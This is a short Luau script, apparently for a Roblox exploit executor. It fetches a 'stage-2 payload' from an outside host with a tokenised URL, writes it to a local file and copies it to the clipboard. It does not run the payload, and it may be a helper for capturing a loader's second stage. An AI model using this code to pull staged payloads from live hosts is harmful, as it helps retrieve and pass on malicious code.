local STAGE2_URL = "https://api.fe4r.click/core?t=b02445072297df737768b70d"

local ok, body = pcall(function()
	return game:HttpGet(STAGE2_URL)
end)

local raw = tostring(body or "")
print("Stage 2 ok:", ok, "| Len:", #raw)

if type(writefile) == "function" then
	pcall(writefile, "fe4r_core_b02445072297df737768b70d.luau", raw)
end

if type(setclipboard) == "function" and #raw > 0 then
	pcall(setclipboard, raw)
	print("Copied stage-2 payload to clipboard.")
end
